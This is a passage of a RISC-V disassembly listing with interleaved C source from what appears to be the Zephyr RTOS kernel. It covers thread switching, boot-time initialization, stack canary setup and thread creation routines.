80004556:	300474f3          	csrrci	s1,mstatus,8
	old_thread = _current;
8000455a:	800097b7          	lui	a5,0x80009
8000455e:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
80004562:	0087a903          	lw	s2,8(a5)
	z_check_stack_sentinel();
80004566:	24fd                	jal	80004854 <z_check_stack_sentinel>
	old_thread->swap_retval = -EAGAIN;
80004568:	57d5                	li	a5,-11
8000456a:	08f92023          	sw	a5,128(s2)
8000456e:	300477f3          	csrrci	a5,mstatus,8
	new_thread = z_swap_next_thread();
80004572:	29f000ef          	jal	ra,80005010 <z_swap_next_thread>
	if (new_thread != old_thread) {
80004576:	00a90f63          	beq	s2,a0,80004594 <z_swap_unlocked+0x54>
8000457a:	842a                	mv	s0,a0
		_current_cpu->current = new_thread;
8000457c:	800097b7          	lui	a5,0x80009
80004580:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
80004584:	c788                	sw	a0,8(a5)
		z_reset_time_slice(new_thread);
80004586:	0f9000ef          	jal	ra,80004e7e <z_reset_time_slice>
	struct k_thread *old = CONTAINER_OF(switched_from, struct k_thread,
					    switch_handle);
#ifdef CONFIG_RISCV_ALWAYS_SWITCH_THROUGH_ECALL
	arch_syscall_invoke2((uintptr_t)new, (uintptr_t)old, RV_ECALL_SCHEDULE);
#else
	z_riscv_switch(new, old);
8000458a:	85ca                	mv	a1,s2
8000458c:	08442503          	lw	a0,132(s0)
80004590:	b90fc0ef          	jal	ra,80000920 <z_riscv_switch>
			  : "r" (key & MSTATUS_IEN)
80004594:	88a1                	andi	s1,s1,8
	__asm__ volatile ("csrs mstatus, %0"
80004596:	3004a073          	csrs	mstatus,s1
	(void) do_swap(arch_irq_lock(), NULL, true);
}
8000459a:	8000c7b7          	lui	a5,0x8000c
8000459e:	4732                	lw	a4,12(sp)
800045a0:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800045a4:	8fb9                	xor	a5,a5,a4
800045a6:	4701                	li	a4,0
800045a8:	e799                	bnez	a5,800045b6 <z_swap_unlocked+0x76>
800045aa:	40f2                	lw	ra,28(sp)
800045ac:	4462                	lw	s0,24(sp)
800045ae:	44d2                	lw	s1,20(sp)
800045b0:	4942                	lw	s2,16(sp)
800045b2:	6105                	addi	sp,sp,32
800045b4:	8082                	ret
800045b6:	73c010ef          	jal	ra,80005cf2 <_StackCheckHandler>

800045ba <switch_to_main_thread>:
	return stack_ptr;
}

__boot_func
static FUNC_NORETURN void switch_to_main_thread(char *stack_ptr)
{
800045ba:	1101                	addi	sp,sp,-32
800045bc:	ce06                	sw	ra,28(sp)
800045be:	8000c7b7          	lui	a5,0x8000c
800045c2:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800045c6:	c63a                	sw	a4,12(sp)
800045c8:	4701                	li	a4,0
	/*
	 * Context switch to main task (entry function is _main()): the
	 * current fake thread is not on a wait queue or ready queue, so it
	 * will never be rescheduled in.
	 */
	z_swap_unlocked();
800045ca:	3f9d                	jal	80004540 <z_swap_unlocked>

800045cc <z_early_memset>:
{
800045cc:	1101                	addi	sp,sp,-32
800045ce:	ce06                	sw	ra,28(sp)
800045d0:	cc22                	sw	s0,24(sp)
800045d2:	8000c437          	lui	s0,0x8000c
800045d6:	95042783          	lw	a5,-1712(s0) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800045da:	c63e                	sw	a5,12(sp)
800045dc:	4781                	li	a5,0
__ssp_bos_icheck3(memset, void *, int)
800045de:	a26fc0ef          	jal	ra,80000804 <memset>
}
800045e2:	4732                	lw	a4,12(sp)
800045e4:	95042783          	lw	a5,-1712(s0)
800045e8:	8fb9                	xor	a5,a5,a4
800045ea:	4701                	li	a4,0
800045ec:	e789                	bnez	a5,800045f6 <z_early_memset+0x2a>
800045ee:	40f2                	lw	ra,28(sp)
800045f0:	4462                	lw	s0,24(sp)
800045f2:	6105                	addi	sp,sp,32
800045f4:	8082                	ret
800045f6:	6fc010ef          	jal	ra,80005cf2 <_StackCheckHandler>

800045fa <z_bss_zero>:
{
800045fa:	1101                	addi	sp,sp,-32
800045fc:	ce06                	sw	ra,28(sp)
800045fe:	cc22                	sw	s0,24(sp)
80004600:	8000c437          	lui	s0,0x8000c
80004604:	95042783          	lw	a5,-1712(s0) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80004608:	c63e                	sw	a5,12(sp)
8000460a:	4781                	li	a5,0
	z_early_memset(__bss_start, 0, __bss_end - __bss_start);
8000460c:	80009537          	lui	a0,0x80009
80004610:	00050613          	mv	a2,a0
80004614:	800097b7          	lui	a5,0x80009
80004618:	54478793          	addi	a5,a5,1348 # 80009544 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009545>
8000461c:	40c78633          	sub	a2,a5,a2
80004620:	4581                	li	a1,0
80004622:	00050513          	mv	a0,a0
80004626:	375d                	jal	800045cc <z_early_memset>
}
80004628:	4732                	lw	a4,12(sp)
8000462a:	95042783          	lw	a5,-1712(s0)
8000462e:	8fb9                	xor	a5,a5,a4
80004630:	4701                	li	a4,0
80004632:	e789                	bnez	a5,8000463c <z_bss_zero+0x42>
80004634:	40f2                	lw	ra,28(sp)
80004636:	4462                	lw	s0,24(sp)
80004638:	6105                	addi	sp,sp,32
8000463a:	8082                	ret
8000463c:	6b6010ef          	jal	ra,80005cf2 <_StackCheckHandler>

80004640 <z_init_cpu>:
{
80004640:	1101                	addi	sp,sp,-32
80004642:	ce06                	sw	ra,28(sp)
80004644:	cc22                	sw	s0,24(sp)
80004646:	ca26                	sw	s1,20(sp)
80004648:	842a                	mv	s0,a0
8000464a:	8000c4b7          	lui	s1,0x8000c
8000464e:	9504a783          	lw	a5,-1712(s1) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80004652:	c63e                	sw	a5,12(sp)
80004654:	4781                	li	a5,0
	init_idle_thread(id);
80004656:	3bfd                	jal	80004454 <init_idle_thread>
	_kernel.cpus[id].idle_thread = &z_idle_threads[id];
80004658:	00341793          	slli	a5,s0,0x3
8000465c:	97a2                	add	a5,a5,s0
8000465e:	0792                	slli	a5,a5,0x4
80004660:	80009737          	lui	a4,0x80009
80004664:	19870713          	addi	a4,a4,408 # 80009198 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009199>
80004668:	97ba                	add	a5,a5,a4
8000466a:	80009737          	lui	a4,0x80009
8000466e:	52070713          	addi	a4,a4,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
80004672:	00141693          	slli	a3,s0,0x1
80004676:	00868633          	add	a2,a3,s0
8000467a:	060e                	slli	a2,a2,0x3
8000467c:	963a                	add	a2,a2,a4
8000467e:	c65c                	sw	a5,12(a2)
	_kernel.cpus[id].id = id;
80004680:	00860a23          	sb	s0,20(a2)
		(Z_KERNEL_STACK_BUFFER(z_interrupt_stacks[id]) +
80004684:	00c41793          	slli	a5,s0,0xc
80004688:	80009637          	lui	a2,0x80009
8000468c:	55060613          	addi	a2,a2,1360 # 80009550 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009551>
80004690:	97b2                	add	a5,a5,a2
80004692:	6605                	lui	a2,0x1
80004694:	97b2                	add	a5,a5,a2
	_kernel.cpus[id].irq_stack =
80004696:	96a2                	add	a3,a3,s0
80004698:	068e                	slli	a3,a3,0x3
8000469a:	9736                	add	a4,a4,a3
8000469c:	c35c                	sw	a5,4(a4)
}
8000469e:	4732                	lw	a4,12(sp)
800046a0:	9504a783          	lw	a5,-1712(s1)
800046a4:	8fb9                	xor	a5,a5,a4
800046a6:	4701                	li	a4,0
800046a8:	e791                	bnez	a5,800046b4 <z_init_cpu+0x74>
800046aa:	40f2                	lw	ra,28(sp)
800046ac:	4462                	lw	s0,24(sp)
800046ae:	44d2                	lw	s1,20(sp)
800046b0:	6105                	addi	sp,sp,32
800046b2:	8082                	ret
800046b4:	63e010ef          	jal	ra,80005cf2 <_StackCheckHandler>

800046b8 <prepare_multithreading>:
{
800046b8:	7139                	addi	sp,sp,-64
800046ba:	de06                	sw	ra,60(sp)
800046bc:	dc22                	sw	s0,56(sp)
800046be:	da26                	sw	s1,52(sp)
800046c0:	d84a                	sw	s2,48(sp)
800046c2:	d64e                	sw	s3,44(sp)
800046c4:	8000c9b7          	lui	s3,0x8000c
800046c8:	9509a783          	lw	a5,-1712(s3) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800046cc:	ce3e                	sw	a5,28(sp)
800046ce:	4781                	li	a5,0
	z_sched_init();
800046d0:	4fc010ef          	jal	ra,80005bcc <z_sched_init>
	_kernel.ready_q.cache = &z_main_thread;
800046d4:	800097b7          	lui	a5,0x80009
800046d8:	80009437          	lui	s0,0x80009
800046dc:	22840493          	addi	s1,s0,552 # 80009228 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009229>
800046e0:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
800046e4:	cf84                	sw	s1,24(a5)
	stack_ptr = z_setup_new_thread(&z_main_thread, z_main_stack,
800046e6:	800087b7          	lui	a5,0x80008
800046ea:	09878793          	addi	a5,a5,152 # 80008098 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80008099>
800046ee:	c23e                	sw	a5,4(sp)
800046f0:	4785                	li	a5,1
800046f2:	c03e                	sw	a5,0(sp)
800046f4:	4881                	li	a7,0
800046f6:	4801                	li	a6,0
800046f8:	4781                	li	a5,0
800046fa:	4701                	li	a4,0
800046fc:	800046b7          	lui	a3,0x80004
80004700:	4e868693          	addi	a3,a3,1256 # 800044e8 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800044e9>
80004704:	6605                	lui	a2,0x1
80004706:	8000b5b7          	lui	a1,0x8000b
8000470a:	95058593          	addi	a1,a1,-1712 # 8000a950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000a951>
8000470e:	22840513          	addi	a0,s0,552
80004712:	2c99                	jal	80004968 <z_setup_new_thread>
80004714:	892a                	mv	s2,a0
80004716:	00d4c783          	lbu	a5,13(s1)
8000471a:	9bed                	andi	a5,a5,-5
8000471c:	00f486a3          	sb	a5,13(s1)
	z_ready_thread(&z_main_thread);
80004720:	22840513          	addi	a0,s0,552
80004724:	6ed000ef          	jal	ra,80005610 <z_ready_thread>
	z_init_cpu(0);
80004728:	4501                	li	a0,0
8000472a:	3f19                	jal	80004640 <z_init_cpu>
}
8000472c:	4772                	lw	a4,28(sp)
8000472e:	9509a783          	lw	a5,-1712(s3)
80004732:	8fb9                	xor	a5,a5,a4
80004734:	4701                	li	a4,0
80004736:	eb89                	bnez	a5,80004748 <prepare_multithreading+0x90>
80004738:	854a                	mv	a0,s2
8000473a:	50f2                	lw	ra,60(sp)
8000473c:	5462                	lw	s0,56(sp)
8000473e:	54d2                	lw	s1,52(sp)
80004740:	5942                	lw	s2,48(sp)
80004742:	59b2                	lw	s3,44(sp)
80004744:	6121                	addi	sp,sp,64
80004746:	8082                	ret
80004748:	5aa010ef          	jal	ra,80005cf2 <_StackCheckHandler>

8000474c <z_early_boot_rand_get>:
#endif /* CONFIG_MULTITHREADING */

#if defined(CONFIG_ENTROPY_HAS_DRIVER) || defined(CONFIG_TEST_RANDOM_GENERATOR)
__boot_func
void z_early_boot_rand_get(uint8_t *buf, size_t length)
{
8000474c:	1101                	addi	sp,sp,-32
8000474e:	ce06                	sw	ra,28(sp)
80004750:	cc22                	sw	s0,24(sp)
80004752:	8000c437          	lui	s0,0x8000c
80004756:	95042783          	lw	a5,-1712(s0) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
8000475a:	c63e                	sw	a5,12(sp)
8000475c:	4781                	li	a5,0
		(void) arch_syscall_invoke2(parm0.x, parm1.x, K_SYSCALL_SYS_RAND_GET);
		return;
	}
#endif
	compiler_barrier();
	z_impl_sys_rand_get(dst, len);
8000475e:	9feff0ef          	jal	ra,8000395c <z_impl_sys_rand_get>
	 * process to use any of them.  Ideally, only the path where entropy
	 * devices are available should be built, this is only a fallback for
	 * those devices without a HWRNG entropy driver.
	 */
	sys_rand_get(buf, length);
}
80004762:	4732                	lw	a4,12(sp)
80004764:	95042783          	lw	a5,-1712(s0)
80004768:	8fb9                	xor	a5,a5,a4
8000476a:	4701                	li	a4,0
8000476c:	e789                	bnez	a5,80004776 <z_early_boot_rand_get+0x2a>
8000476e:	40f2                	lw	ra,28(sp)
80004770:	4462                	lw	s0,24(sp)
80004772:	6105                	addi	sp,sp,32
80004774:	8082                	ret
80004776:	57c010ef          	jal	ra,80005cf2 <_StackCheckHandler>

8000477a <z_cstart>:
 *
 * @return Does not return
 */
__boot_func
FUNC_NORETURN void z_cstart(void)
{
8000477a:	7171                	addi	sp,sp,-176
8000477c:	d706                	sw	ra,172(sp)
8000477e:	d522                	sw	s0,168(sp)
80004780:	8000c437          	lui	s0,0x8000c
80004784:	95042783          	lw	a5,-1712(s0) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80004788:	cf3e                	sw	a5,156(sp)
8000478a:	4781                	li	a5,0
	__asm__ volatile ("li tp, 0");
8000478c:	4201                	li	tp,0
	z_riscv_pmp_init();
8000478e:	e21fe0ef          	jal	ra,800035ae <z_riscv_pmp_init>
 *
 * The memory of the dummy thread can be completely uninitialized.
 */
static inline void z_dummy_thread_init(struct k_thread *dummy_thread)
{
	dummy_thread->base.thread_state = _THREAD_DUMMY;
80004792:	4785                	li	a5,1
80004794:	00f10aa3          	sb	a5,21(sp)
#ifdef CONFIG_SCHED_CPU_MASK
	dummy_thread->base.cpu_mask = -1;
#endif
	dummy_thread->base.user_options = K_ESSENTIAL;
80004798:	00f10a23          	sb	a5,20(sp)
#ifdef CONFIG_THREAD_STACK_INFO
	dummy_thread->stack_info.start = 0U;
8000479c:	de82                	sw	zero,124(sp)
	dummy_thread->stack_info.size = 0U;
8000479e:	c102                	sw	zero,128(sp)
	dummy_thread->mem_domain_info.mem_domain = &k_mem_domain_default;
#endif
#if (CONFIG_HEAP_MEM_POOL_SIZE > 0)
	k_thread_system_pool_assign(dummy_thread);
#else
	dummy_thread->resource_pool = NULL;
800047a0:	c902                	sw	zero,144(sp)

#ifdef CONFIG_TIMESLICE_PER_THREAD
	dummy_thread->base.slice_ticks = 0;
#endif

	_current_cpu->current = dummy_thread;
800047a2:	800097b7          	lui	a5,0x80009
800047a6:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
800047aa:	0038                	addi	a4,sp,8
800047ac:	c798                	sw	a4,8(a5)
	struct k_thread dummy_thread;

	z_dummy_thread_init(&dummy_thread);
#endif
	/* do any necessary initialization of static devices */
	z_device_state_init();
800047ae:	b1dff0ef          	jal	ra,800042ca <z_device_state_init>

	/* perform basic hardware initialization */
	z_sys_init_run_level(_SYS_INIT_LEVEL_PRE_KERNEL_1);
800047b2:	4501                	li	a0,0
800047b4:	b59ff0ef          	jal	ra,8000430c <z_sys_init_run_level>
	z_sys_init_run_level(_SYS_INIT_LEVEL_PRE_KERNEL_2);
800047b8:	4505                	li	a0,1
800047ba:	b53ff0ef          	jal	ra,8000430c <z_sys_init_run_level>

#ifdef CONFIG_STACK_CANARIES
	uintptr_t stack_guard;

	z_early_boot_rand_get((uint8_t *)&stack_guard, sizeof(stack_guard));
800047be:	4591                	li	a1,4
800047c0:	0048                	addi	a0,sp,4
800047c2:	3769                	jal	8000474c <z_early_boot_rand_get>
	__stack_chk_guard = stack_guard;
800047c4:	4792                	lw	a5,4(sp)
800047c6:	94f42823          	sw	a5,-1712(s0)
	__stack_chk_guard <<= 8;
800047ca:	95042783          	lw	a5,-1712(s0)
800047ce:	07a2                	slli	a5,a5,0x8
800047d0:	94f42823          	sw	a5,-1712(s0)
	timing_init();
	timing_start();
#endif

#ifdef CONFIG_MULTITHREADING
	switch_to_main_thread(prepare_multithreading());
800047d4:	35d5                	jal	800046b8 <prepare_multithreading>
800047d6:	de5ff0ef          	jal	ra,800045ba <switch_to_main_thread>

800047da <setup_thread_stack>:
#endif /* CONFIG_STACK_GROWS_UP */
#endif /* CONFIG_STACK_POINTER_RANDOM */

static char *setup_thread_stack(struct k_thread *new_thread,
				k_thread_stack_t *stack, size_t stack_size)
{
800047da:	7179                	addi	sp,sp,-48
800047dc:	d606                	sw	ra,44(sp)
800047de:	d422                	sw	s0,40(sp)
800047e0:	d226                	sw	s1,36(sp)
800047e2:	d04a                	sw	s2,32(sp)
800047e4:	ce4e                	sw	s3,28(sp)
800047e6:	cc52                	sw	s4,24(sp)
800047e8:	84aa                	mv	s1,a0
800047ea:	892e                	mv	s2,a1
800047ec:	8000ca37          	lui	s4,0x8000c
800047f0:	950a2783          	lw	a5,-1712(s4) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800047f4:	c63e                	sw	a5,12(sp)
800047f6:	4781                	li	a5,0
		stack_buf_size = stack_obj_size - K_THREAD_STACK_RESERVED;
	} else
#endif
	{
		/* Object cannot host a user mode thread */
		stack_obj_size = Z_KERNEL_STACK_SIZE_ADJUST(stack_size);
800047f8:	00f60413          	addi	s0,a2,15 # 100f <CONFIG_ISR_STACK_SIZE+0xf>
800047fc:	9841                	andi	s0,s0,-16
	}

	/* Initial stack pointer at the high end of the stack object, may
	 * be reduced later in this function by TLS or random offset
	 */
	stack_ptr = (char *)stack + stack_obj_size;
800047fe:	008589b3          	add	s3,a1,s0
80004802:	8622                	mv	a2,s0
80004804:	0aa00593          	li	a1,170
80004808:	854a                	mv	a0,s2
8000480a:	ffbfb0ef          	jal	ra,80000804 <memset>
#ifdef CONFIG_STACK_SENTINEL
	/* Put the stack sentinel at the lowest 4 bytes of the stack area.
	 * We periodically check that it's still present and kill the thread
	 * if it isn't.
	 */
	*((uint32_t *)stack_buf_start) = STACK_SENTINEL;
8000480e:	f0f0f7b7          	lui	a5,0xf0f0f
80004812:	0f078793          	addi	a5,a5,240 # f0f0f0f0 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0xf0f0f0f1>
80004816:	00f92023          	sw	a5,0(s2)
#endif /* CONFIG_STACK_SENTINEL */
#ifdef CONFIG_THREAD_LOCAL_STORAGE
	/* TLS is always last within the stack buffer */
	delta += arch_tls_stack_setup(new_thread, stack_ptr);
8000481a:	85ce                	mv	a1,s3
8000481c:	8526                	mv	a0,s1
8000481e:	e79fe0ef          	jal	ra,80003696 <arch_tls_stack_setup>
		(struct _thread_userspace_local_data *)(stack_ptr - delta);
#endif
#if CONFIG_STACK_POINTER_RANDOM
	delta += random_offset(stack_buf_size);
#endif
	delta = ROUND_UP(delta, ARCH_STACK_PTR_ALIGN);
80004822:	00f50793          	addi	a5,a0,15 # 8000900f <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009010>
80004826:	9bc1                	andi	a5,a5,-16
	 * will need to appropriately update this.
	 *
	 * The bounds tracked here correspond to the area of the stack object
	 * that the thread can access, which includes TLS.
	 */
	new_thread->stack_info.start = (uintptr_t)stack_buf_start;
80004828:	0724aa23          	sw	s2,116(s1)
	new_thread->stack_info.size = stack_buf_size;
8000482c:	dca0                	sw	s0,120(s1)
	new_thread->stack_info.delta = delta;
8000482e:	dcfc                	sw	a5,124(s1)
#endif
	stack_ptr -= delta;
80004830:	40f98533          	sub	a0,s3,a5

	return stack_ptr;
}
80004834:	4732                	lw	a4,12(sp)
80004836:	950a2783          	lw	a5,-1712(s4)
8000483a:	8fb9                	xor	a5,a5,a4
8000483c:	4701                	li	a4,0
8000483e:	eb89                	bnez	a5,80004850 <setup_thread_stack+0x76>
80004840:	50b2                	lw	ra,44(sp)
80004842:	5422                	lw	s0,40(sp)
80004844:	5492                	lw	s1,36(sp)
80004846:	5902                	lw	s2,32(sp)
80004848:	49f2                	lw	s3,28(sp)
8000484a:	4a62                	lw	s4,24(sp)
8000484c:	6145                	addi	sp,sp,48
8000484e:	8082                	ret
80004850:	4a2010ef          	jal	ra,80005cf2 <_StackCheckHandler>

80004854 <z_check_stack_sentinel>:
{
80004854:	1101                	addi	sp,sp,-32
80004856:	ce06                	sw	ra,28(sp)
80004858:	8000c7b7          	lui	a5,0x8000c
8000485c:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80004860:	c63a                	sw	a4,12(sp)
80004862:	4701                	li	a4,0
	if ((_current->base.thread_state & _THREAD_DUMMY) != 0) {
80004864:	800097b7          	lui	a5,0x80009
80004868:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
8000486c:	4798                	lw	a4,8(a5)
8000486e:	00d74783          	lbu	a5,13(a4)
80004872:	8b85                	andi	a5,a5,1
80004874:	e395                	bnez	a5,80004898 <z_check_stack_sentinel+0x44>
	stack = (uint32_t *)_current->stack_info.start;
80004876:	5b78                	lw	a4,116(a4)
	if (*stack != STACK_SENTINEL) {
80004878:	4314                	lw	a3,0(a4)
8000487a:	f0f0f7b7          	lui	a5,0xf0f0f
8000487e:	0f078793          	addi	a5,a5,240 # f0f0f0f0 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0xf0f0f0f1>
80004882:	00f68b63          	beq	a3,a5,80004898 <z_check_stack_sentinel+0x44>
		*stack = STACK_SENTINEL;
80004886:	f0f0f7b7          	lui	a5,0xf0f0f
8000488a:	0f078793          	addi	a5,a5,240 # f0f0f0f0 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0xf0f0f0f1>
8000488e:	c31c                	sw	a5,0(a4)
	register unsigned long a0 __asm__ ("a0") = arg1;
80004890:	4509                	li	a0,2
	register unsigned long t0 __asm__ ("t0") = call_id;
80004892:	4281                	li	t0,0
	__asm__ volatile ("ecall"
80004894:	00000073          	ecall
}
80004898:	8000c7b7          	lui	a5,0x8000c
8000489c:	4732                	lw	a4,12(sp)
8000489e:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800048a2:	8fb9                	xor	a5,a5,a4
800048a4:	4701                	li	a4,0
800048a6:	e781                	bnez	a5,800048ae <z_check_stack_sentinel+0x5a>
800048a8:	40f2                	lw	ra,28(sp)
800048aa:	6105                	addi	sp,sp,32
800048ac:	8082                	ret
800048ae:	444010ef          	jal	ra,80005cf2 <_StackCheckHandler>

800048b2 <z_impl_k_thread_start>:
{
800048b2:	1101                	addi	sp,sp,-32
800048b4:	ce06                	sw	ra,28(sp)
800048b6:	cc22                	sw	s0,24(sp)
800048b8:	8000c437          	lui	s0,0x8000c
800048bc:	95042783          	lw	a5,-1712(s0) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800048c0:	c63e                	sw	a5,12(sp)
800048c2:	4781                	li	a5,0
	z_sched_start(thread);
800048c4:	5a3000ef          	jal	ra,80005666 <z_sched_start>
}
800048c8:	4732                	lw	a4,12(sp)
800048ca:	95042783          	lw	a5,-1712(s0)
800048ce:	8fb9                	xor	a5,a5,a4
800048d0:	4701                	li	a4,0
800048d2:	e789                	bnez	a5,800048dc <z_impl_k_thread_start+0x2a>
800048d4:	40f2                	lw	ra,28(sp)
800048d6:	4462                	lw	s0,24(sp)
800048d8:	6105                	addi	sp,sp,32
800048da:	8082                	ret
800048dc:	416010ef          	jal	ra,80005cf2 <_StackCheckHandler>

800048e0 <schedule_new_thread>:
{
800048e0:	1101                	addi	sp,sp,-32
800048e2:	ce06                	sw	ra,28(sp)
800048e4:	86b2                	mv	a3,a2
800048e6:	8000c7b7          	lui	a5,0x8000c
800048ea:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800048ee:	c63a                	sw	a4,12(sp)
800048f0:	4701                	li	a4,0
	if (K_TIMEOUT_EQ(delay, K_NO_WAIT)) {
800048f2:	00b667b3          	or	a5,a2,a1
800048f6:	ef89                	bnez	a5,80004910 <schedule_new_thread+0x30>
	z_impl_k_thread_start(thread);
800048f8:	3f6d                	jal	800048b2 <z_impl_k_thread_start>
}
800048fa:	8000c7b7          	lui	a5,0x8000c
800048fe:	4732                	lw	a4,12(sp)
80004900:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80004904:	8fb9                	xor	a5,a5,a4
80004906:	4701                	li	a4,0
80004908:	ef89                	bnez	a5,80004922 <schedule_new_thread+0x42>
8000490a:	40f2                	lw	ra,28(sp)
8000490c:	6105                	addi	sp,sp,32
8000490e:	8082                	ret
80004910:	862e                	mv	a2,a1

extern void z_thread_timeout(struct _timeout *timeout);

static inline void z_add_thread_timeout(struct k_thread *thread, k_timeout_t ticks)
{
	z_add_timeout(&thread->base.timeout, z_thread_timeout, ticks);
80004912:	800055b7          	lui	a1,0x80005
80004916:	6c058593          	addi	a1,a1,1728 # 800056c0 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800056c1>
8000491a:	0561                	addi	a0,a0,24
8000491c:	57c010ef          	jal	ra,80005e98 <z_add_timeout>
80004920:	bfe9                	j	800048fa <schedule_new_thread+0x1a>
80004922:	3d0010ef          	jal	ra,80005cf2 <_StackCheckHandler>

80004926 <z_init_thread_base>:
}
#endif

void z_init_thread_base(struct _thread_base *thread_base, int priority,
		       uint32_t initial_state, unsigned int options)
{
80004926:	1101                	addi	sp,sp,-32
80004928:	ce06                	sw	ra,28(sp)
8000492a:	8000c7b7          	lui	a5,0x8000c
8000492e:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80004932:	c63a                	sw	a4,12(sp)
80004934:	4701                	li	a4,0
	/* k_q_node is initialized upon first insertion in a list */
	thread_base->pended_on = NULL;
80004936:	00052423          	sw	zero,8(a0)
	thread_base->user_options = (uint8_t)options;
8000493a:	00d50623          	sb	a3,12(a0)
	thread_base->thread_state = (uint8_t)initial_state;
8000493e:	00c506a3          	sb	a2,13(a0)

	thread_base->prio = priority;
80004942:	00b50723          	sb	a1,14(a0)

	thread_base->sched_locked = 0U;
80004946:	000507a3          	sb	zero,15(a0)
 * @param node the node
 */

static inline void sys_dnode_init(sys_dnode_t *node)
{
	node->next = NULL;
8000494a:	00052c23          	sw	zero,24(a0)
	node->prev = NULL;
8000494e:	00052e23          	sw	zero,28(a0)
#endif

	/* swap_data does not need to be initialized */

	z_init_thread_timeout(thread_base);
}
80004952:	4732                	lw	a4,12(sp)
80004954:	9507a783          	lw	a5,-1712(a5)
80004958:	8fb9                	xor	a5,a5,a4
8000495a:	4701                	li	a4,0
8000495c:	e781                	bnez	a5,80004964 <z_init_thread_base+0x3e>
8000495e:	40f2                	lw	ra,28(sp)
80004960:	6105                	addi	sp,sp,32
80004962:	8082                	ret
80004964:	38e010ef          	jal	ra,80005cf2 <_StackCheckHandler>

80004968 <z_setup_new_thread>:
{
80004968:	7139                	addi	sp,sp,-64
8000496a:	de06                	sw	ra,60(sp)
8000496c:	dc22                	sw	s0,56(sp)
8000496e:	da26                	sw	s1,52(sp)
80004970:	d84a                	sw	s2,48(sp)
80004972:	d64e                	sw	s3,44(sp)
80004974:	d452                	sw	s4,40(sp)
80004976:	d256                	sw	s5,36(sp)
80004978:	d05a                	sw	s6,32(sp)
8000497a:	ce5e                	sw	s7,28(sp)
8000497c:	842a                	mv	s0,a0
8000497e:	84ae                	mv	s1,a1
80004980:	8932                	mv	s2,a2
80004982:	89b6                	mv	s3,a3
80004984:	8a3a                	mv	s4,a4
80004986:	8abe                	mv	s5,a5
80004988:	8b42                	mv	s6,a6
8000498a:	85c6                	mv	a1,a7
8000498c:	8000cbb7          	lui	s7,0x8000c
80004990:	950ba783          	lw	a5,-1712(s7) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80004994:	c63e                	sw	a5,12(sp)
80004996:	4781                	li	a5,0
	SYS_DLIST_FOR_EACH_CONTAINER(&((wq)->waitq), thread_ptr, \
				     base.qnode_dlist)

static inline void z_waitq_init(_wait_q_t *w)
{
	sys_dlist_init(&w->waitq);
80004998:	06c50793          	addi	a5,a0,108
	list->head = (sys_dnode_t *)list;
8000499c:	d57c                	sw	a5,108(a0)
	list->tail = (sys_dnode_t *)list;
8000499e:	d93c                	sw	a5,112(a0)
	z_init_thread_base(&new_thread->base, prio, _THREAD_PRESTART, options);
800049a0:	4686                	lw	a3,64(sp)
800049a2:	4611                	li	a2,4
800049a4:	3749                	jal	80004926 <z_init_thread_base>
	stack_ptr = setup_thread_stack(new_thread, stack, stack_size);
800049a6:	864a                	mv	a2,s2
800049a8:	85a6                	mv	a1,s1
800049aa:	8522                	mv	a0,s0
800049ac:	e2fff0ef          	jal	ra,800047da <setup_thread_stack>
800049b0:	892a                	mv	s2,a0
	arch_new_thread(new_thread, stack, stack_ptr, entry, p1, p2, p3);
800049b2:	885a                	mv	a6,s6
800049b4:	87d6                	mv	a5,s5
800049b6:	8752                	mv	a4,s4
800049b8:	86ce                	mv	a3,s3
800049ba:	862a                	mv	a2,a0
800049bc:	85a6                	mv	a1,s1
800049be:	8522                	mv	a0,s0
